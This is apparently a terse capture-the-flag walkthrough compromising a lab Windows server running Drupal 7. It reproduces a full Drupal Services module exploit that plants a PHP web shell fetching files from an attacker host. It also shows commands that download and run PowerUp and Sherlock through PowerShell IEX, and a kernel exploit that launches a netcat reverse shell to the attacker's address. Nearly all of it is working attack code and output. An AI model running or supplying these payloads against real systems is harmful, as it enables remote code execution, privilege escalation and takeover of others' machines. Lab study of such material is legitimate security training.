```
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-21 07:42 EDT
Nmap scan report for 10.10.10.9 (10.10.10.9)
Host is up (0.16s latency).
Not shown: 997 filtered ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods:
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.38 seconds

```

Drupal:
./droopescan scan drupal -u http://10.10.10.9
```
[+] Themes found:                                                               
    seven http://10.10.10.9/themes/seven/
    garland http://10.10.10.9/themes/garland/

[+] Possible interesting urls found:
    Default changelog file - http://10.10.10.9/CHANGELOG.txt
    Default admin - http://10.10.10.9/user/login

[+] Possible version(s):
    7.54

[+] Plugins found:
    ctools http://10.10.10.9/sites/all/modules/ctools/
        http://10.10.10.9/sites/all/modules/ctools/CHANGELOG.txt
        http://10.10.10.9/sites/all/modules/ctools/changelog.txt
        http://10.10.10.9/sites/all/modules/ctools/CHANGELOG.TXT
        http://10.10.10.9/sites/all/modules/ctools/LICENSE.txt
        http://10.10.10.9/sites/all/modules/ctools/API.txt
    libraries http://10.10.10.9/sites/all/modules/libraries/
        http://10.10.10.9/sites/all/modules/libraries/CHANGELOG.txt
        http://10.10.10.9/sites/all/modules/libraries/changelog.txt
        http://10.10.10.9/sites/all/modules/libraries/CHANGELOG.TXT
        http://10.10.10.9/sites/all/modules/libraries/README.txt
        http://10.10.10.9/sites/all/modules/libraries/readme.txt
        http://10.10.10.9/sites/all/modules/libraries/README.TXT
        http://10.10.10.9/sites/all/modules/libraries/LICENSE.txt
    services http://10.10.10.9/sites/all/modules/services/
        http://10.10.10.9/sites/all/modules/services/README.txt
        http://10.10.10.9/sites/all/modules/services/readme.txt
        http://10.10.10.9/sites/all/modules/services/README.TXT
        http://10.10.10.9/sites/all/modules/services/LICENSE.txt
    image http://10.10.10.9/modules/image/
    profile http://10.10.10.9/modules/profile/
    php http://10.10.10.9/modules/php/

```

```
# Exploit Title: Drupal 7.x Services Module Remote Code Execution
# Vendor Homepage: https://www.drupal.org/project/services
# Exploit Author: Charles FOL
# Contact: https://twitter.com/ambionics
# Website: https://www.ambionics.io/blog/drupal-services-module-rce


#!/usr/bin/php
<?php
# Drupal Services Module Remote Code Execution Exploit
# https://www.ambionics.io/blog/drupal-services-module-rce
# cf
#
# Three stages:
# 1. Use the SQL Injection to get the contents of the cache for current endpoint
#    along with admin credentials and hash
# 2. Alter the cache to allow us to write a file and do so
# 3. Restore the cache
#

# Initialization
error_reporting(E_ALL);

define('QID', 'anything');
define('TYPE_PHP', 'application/vnd.php.serialized');
define('TYPE_JSON', 'application/json');
define('CONTROLLER', 'user');
define('ACTION', 'login');

$url = 'http://10.10.10.9';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';


$fileRead = fopen("shell.php", "r") or die("No such file!");
$shell = fread($fileRead,filesize("shell.php"));


$phpCode = <<<'EOD'
<?php
	if (isset($_REQUEST['fupload'])) {
  		file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.14.9:8000/" . $_REQUEST['fupload']));
	};

	if (isset($_REQUEST['fexec'])) {
  		echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
	};
?>
EOD;

$file = [
    'filename' => 'dixuSOspsOUU.php',
    'data' => $phpCode
];

$browser = new Browser($url . $endpoint_path);


# Stage 1: SQL Injection

class DatabaseCondition
{
    protected $conditions = [
        "#conjunction" => "AND"
    ];
    protected $arguments = [];
    protected $changed = false;
    protected $queryPlaceholderIdentifier = null;
    public $stringVersion = null;

    public function __construct($stringVersion=null)
    {
        $this->stringVersion = $stringVersion;

        if(!isset($stringVersion))
        {
            $this->changed = true;
            $this->stringVersion = null;
        }
    }
}

class SelectQueryExtender {
    # Contains a DatabaseCondition object instead of a SelectQueryInterface
    # so that $query->compile() exists and (string) $query is controlled by us.
    protected $query = null;

    protected $uniqueIdentifier = QID;
    protected $connection;
    protected $placeholder = 0;

    public function __construct($sql)
    {
        $this->query = new DatabaseCondition($sql);
    }
}

$cache_id = "services:$endpoint:resources";
$sql_cache = "SELECT data FROM {cache} WHERE cid='$cache_id'";
$password_hash = '$S$D2NH.6IZNb1vbZEV1F0S9fqIz3A0Y1xueKznB8vWrMsnV/nrTpnd';

# Take first user but with a custom password
# Store the original password hash in signature_format, and endpoint cache
# in signature
$query =
    "0x3a) UNION SELECT ux.uid AS uid, " .
    "ux.name AS name, '$password_hash' AS pass, " .
    "ux.mail AS mail, ux.theme AS theme, ($sql_cache) AS signature, " .
    "ux.pass AS signature_format, ux.created AS created, " .
    "ux.access AS access, ux.login AS login, ux.status AS status, " .
    "ux.timezone AS timezone, ux.language AS language, ux.picture " .
    "AS picture, ux.init AS init, ux.data AS data FROM {users} ux " .
    "WHERE ux.uid<>(0"
;

$query = new SelectQueryExtender($query);
$data = ['username' => $query, 'password' => 'ouvreboite'];
$data = serialize($data);

$json = $browser->post(TYPE_PHP, $data);

# If this worked, the rest will as well
if(!isset($json->user))
{
    print_r($json);
    e("Failed to login with fake password");
}

# Store session and user data

$session = [
    'session_name' => $json->session_name,
    'session_id' => $json->sessid,
    'token' => $json->token
];
store('session', $session);

$user = $json->user;

# Unserialize the cached value
# Note: Drupal websites admins, this is your opportunity to fight back :)
$cache = unserialize($user->signature);

# Reassign fields
$user->pass = $user->signature_format;
unset($user->signature);
unset($user->signature_format);

store('user', $user);

if($cache === false)
{
    e("Unable to obtains endpoint's cache value");
}

x("Cache contains " . sizeof($cache) . " entries");

# Stage 2: Change endpoint's behaviour to write a shell

class DrupalCacheArray
{
    # Cache ID
    protected $cid = "services:endpoint_name:resources";
    # Name of the table to fetch data from.
    # Can also be used to SQL inject in DrupalDatabaseCache::getMultiple()
    protected $bin = 'cache';
    protected $keysToPersist = [];
    protected $storage = [];

    function __construct($storage, $endpoint, $controller, $action) {
        $settings = [
            'services' => ['resource_api_version' => '1.0']
        ];
        $this->cid = "services:$endpoint:resources";

        # If no endpoint is given, just reset the original values
        if(isset($controller))
        {
            $storage[$controller]['actions'][$action] = [
                'help' => 'Writes data to a file',
                # Callback function
                'callback' => 'file_put_contents',
                # This one does not accept "true" as Drupal does,
                # so we just go for a tautology
                'access callback' => 'is_string',
                'access arguments' => ['a string'],
                # Arguments given through POST
                'args' => [
                    0 => [
                        'name' => 'filename',
                        'type' => 'string',
                        'description' => 'Path to the file',
                        'source' => ['data' => 'filename'],
                        'optional' => false,
                    ],
                    1 => [
                        'name' => 'data',
                        'type' => 'string',
                        'description' => 'The data to write',
                        'source' => ['data' => 'data'],
                        'optional' => false,
                    ],
                ],
                'file' => [
                    'type' => 'inc',
                    'module' => 'services',
                    'name' => 'resources/user_resource',
                ],
                'endpoint' => $settings
            ];
            $storage[$controller]['endpoint']['actions'] += [
                $action => [
                    'enabled' => 1,
                    'settings' => $settings
                ]
            ];
        }

        $this->storage = $storage;
        $this->keysToPersist = array_fill_keys(array_keys($storage), true);
    }
}

class ThemeRegistry Extends DrupalCacheArray {
    protected $persistable;
    protected $completeRegistry;
}

cache_poison($endpoint, $cache);

# Write the file
$json = (array) $browser->post(TYPE_JSON, json_encode($file));


# Stage 3: Restore endpoint's behaviour

cache_reset($endpoint, $cache);

if(!(isset($json[0]) && $json[0] === strlen($file['data'])))
{
    e("Failed to write file.");
}

$file_url = $url . '/' . $file['filename'];
x("File written: $file_url");


# HTTP Browser

class Browser
{
    private $url;
    private $controller = CONTROLLER;
    private $action = ACTION;

    function __construct($url)
    {
        $this->url = $url;
    }

    function post($type, $data)
    {
        $headers = [
            "Accept: " . TYPE_JSON,
            "Content-Type: $type",
            "Content-Length: " . strlen($data)
        ];
        $url = $this->url . '/' . $this->controller . '/' . $this->action;

        $s = curl_init();
        curl_setopt($s, CURLOPT_URL, $url);
        curl_setopt($s, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($s, CURLOPT_POST, 1);
        curl_setopt($s, CURLOPT_POSTFIELDS, $data);
        curl_setopt($s, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($s, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($s, CURLOPT_SSL_VERIFYPEER, 0);
        $output = curl_exec($s);
        $error = curl_error($s);
        curl_close($s);

        if($error)
        {
            e("cURL: $error");
        }

        return json_decode($output);
    }
}

# Cache

function cache_poison($endpoint, $cache)
{
    $tr = new ThemeRegistry($cache, $endpoint, CONTROLLER, ACTION);
    cache_edit($tr);
}

function cache_reset($endpoint, $cache)
{
    $tr = new ThemeRegistry($cache, $endpoint, null, null);
    cache_edit($tr);
}

function cache_edit($tr)
{
    global $browser;
    $data = serialize([$tr]);
    $json = $browser->post(TYPE_PHP, $data);
}

# Utils

function x($message)
{
    print("$message\n");
}

function e($message)
{
    x($message);
    exit(1);
}

function store($name, $data)
{
    $filename = "$name.json";
    file_put_contents($filename, json_encode($data, JSON_PRETTY_PRINT));
    x("Stored $name information in $filename");
}

```

```
http://10.10.10.9/dixuSOspsOUU.php?fexec=type%20C:\Users\dimitris\Desktop\user.txt
ba22fde1932d06eb76a163d312f921a2
```

http://10.10.10.9/dixuSOspsOUU.php?fexec=systeminfo
```
./windows-exploit-suggester.py --database 2019-04-21-mssb.xls --systeminfo ~/HTB/bastard/systeminfo
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*]
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*]
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done

```

http://10.10.10.9/dixuSOspsOUU.php?fexec=echo IEX ((New-Object System.Net.WebClient).DownloadString('http://10.10.14.9:8000/PowerUp.ps1')) | powershell -noprofile -
http://10.10.10.9/dixuSOspsOUU.php?fexec=sc query state= all
```
[*] Running Invoke-AllChecks


[*] Checking if user is in a local group with administrative privileges...


[*] Checking for unquoted service paths...
Get-WmiObject : Access denied
At line:1451 char:34
+     $VulnServices = Get-WmiObject <<<<  -Class win32_service | Where-Object {
$_} | Where-Object {($_.pathname -ne $null) -and ($_.pathname.trim() -ne '')} |
 Where-Object { (-not $_.pathname.StartsWith("`"")) -and (-not $_.pathname.Star
tsWith("'"))} | Where-Object {($_.pathname.Substring(0, $_.pathname.ToLower().I
ndexOf(".exe") + 4)) -match ".* .*"}
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], Managemen
   tException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.C
   ommands.GetWmiObjectCommand



[*] Checking service executable and argument permissions...
Get-WmiObject : Access denied
At line:1504 char:18
+     Get-WMIObject <<<<  -Class win32_service | Where-Object {$_ -and $_.pathn
ame} | ForEach-Object {
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], Managemen
   tException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.C
   ommands.GetWmiObjectCommand



[*] Checking service permissions...
Get-Service : Cannot open Service Control Manager on computer '.'. This operati
on might require other privileges.
At line:1555 char:16
+     Get-Service <<<<  | Test-ServiceDaclPermission -PermissionSet 'ChangeConf
ig' | ForEach-Object {
    + CategoryInfo          : NotSpecified: (:) [Get-Service], InvalidOperatio
   nException
    + FullyQualifiedErrorId : System.InvalidOperationException,Microsoft.Power
   Shell.Commands.GetServiceCommand



[*] Checking %PATH% for potentially hijackable DLL locations...


Permissions       : AppendData/AddSubdirectory
ModifiablePath    : C:\oracle\ora90\bin
IdentityReference : BUILTIN\Users
%PATH%            : C:\oracle\ora90\bin
AbuseFunction     : Write-HijackDll -DllPath 'C:\oracle\ora90\bin\wlbsctrl.dll'

Permissions       : WriteData/AddFile
ModifiablePath    : C:\oracle\ora90\bin
IdentityReference : BUILTIN\Users
%PATH%            : C:\oracle\ora90\bin
AbuseFunction     : Write-HijackDll -DllPath 'C:\oracle\ora90\bin\wlbsctrl.dll'

Permissions       : AppendData/AddSubdirectory
ModifiablePath    : C:\oracle\ora90\Apache\Perl\5.00503\bin\mswin32-x86
IdentityReference : BUILTIN\Users
%PATH%            : C:\oracle\ora90\Apache\Perl\5.00503\bin\mswin32-x86
AbuseFunction     : Write-HijackDll -DllPath 'C:\oracle\ora90\Apache\Perl\5.005
                    03\bin\mswin32-x86\wlbsctrl.dll'

Permissions       : WriteData/AddFile
ModifiablePath    : C:\oracle\ora90\Apache\Perl\5.00503\bin\mswin32-x86
IdentityReference : BUILTIN\Users
%PATH%            : C:\oracle\ora90\Apache\Perl\5.00503\bin\mswin32-x86
AbuseFunction     : Write-HijackDll -DllPath 'C:\oracle\ora90\Apache\Perl\5.005
                    03\bin\mswin32-x86\wlbsctrl.dll'





[*] Checking for AlwaysInstallElevated registry key...


[*] Checking for Autologon credentials in registry...


[*] Checking for modifidable registry autoruns and configs...


[*] Checking for modifiable schtask files/configs...


[*] Checking for unattended install files...


[*] Checking for encrypted web.config strings...


[*] Checking for encrypted application pool and virtual directory passwords...


[*] Checking for plaintext passwords in McAfee SiteList.xml files....




[*] Checking for cached Group Policy Preferences .xml files....
Add-Type : Could not load file or assembly 'System.Core, Version=3.5.0.0, Cultu
re=neutral, PublicKeyToken=b77a5c561934e089' or one of its dependencies. The sy
stem cannot find the file specified.
At line:3565 char:13
+     Add-Type <<<<  -Assembly System.Core
    + CategoryInfo          : NotSpecified: (:) [Add-Type], FileNotFoundExcept
   ion
    + FullyQualifiedErrorId : System.IO.FileNotFoundException,Microsoft.PowerS
   hell.Commands.AddTypeCommand
```

No oracle running:
http://10.10.10.9/dixuSOspsOUU.php?fexec=netstat%20-an
```
Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
  TCP    0.0.0.0:81             0.0.0.0:0              LISTENING
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING
  TCP    10.10.10.9:80          10.10.14.9:53588       CLOSE_WAIT
  TCP    10.10.10.9:80          10.10.14.9:53634       ESTABLISHED
  TCP    10.10.10.9:139         0.0.0.0:0              LISTENING
  TCP    [::]:80                [::]:0                 LISTENING
  TCP    [::]:81                [::]:0                 LISTENING
  TCP    [::]:135               [::]:0                 LISTENING
  TCP    [::]:445               [::]:0                 LISTENING
  TCP    [::]:47001             [::]:0                 LISTENING
  TCP    [::]:49152             [::]:0                 LISTENING
  TCP    [::]:49153             [::]:0                 LISTENING
  TCP    [::]:49154             [::]:0                 LISTENING
  TCP    [::]:49155             [::]:0                 LISTENING
  TCP    [::]:49156             [::]:0                 LISTENING
  UDP    0.0.0.0:123            *:*                    
  UDP    0.0.0.0:5355           *:*                    
  UDP    10.10.10.9:137         *:*                    
  UDP    10.10.10.9:138         *:*                    
  UDP    [::]:123               *:*                    

```


10.10.10.9/dixuSOspsOUU.php?fexec=echo IEX ((New-Object System.Net.WebClient).DownloadString('http://10.10.14.9:8000/Sherlock.ps1')) | powershell -noprofile -
```

Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Appears Vulnerable

Title      : NTUserMessageCall Win32k Kernel Pool Overflow
MSBulletin : MS13-053
CVEID      : 2013-1300
Link       : https://www.exploit-db.com/exploits/33213/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Not Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Appears Vulnerable

Title      : Font Driver Buffer Overflow
MSBulletin : MS15-078
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable

Title      : 'mrxdav.sys' WebDAV
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/
VulnStatus : Not supported on 64-bit systems

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable

Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034
CVEID      : 2016-0093/94/95/96
Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1
             6-034?
VulnStatus : Not Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S
             ample-Exploits/MS16-135
VulnStatus : Not Vulnerable

Title      : Nessus Agent 6.6.2 - 6.10.3
MSBulletin : N/A
CVEID      : 2017-7199
Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h
             tml
VulnStatus : Not Vulnerable
```

https://github.com/hfiref0x/CVE-2015-1701

http://10.10.10.9/dixuSOspsOUU.php?fexec=ms15-051x64.exe "nc64.exe -e cmd 10.10.14.9 2233"

`4bf12b963da1b30cc93496f617f7ba7c`


# Share files over SMB
impacket-smbserver test1 `pwd`
http://10.10.10.9/dixuSOspsOUU.php?fexec=\\10.10.14.9\test1\ms15-051x64.exe whoami
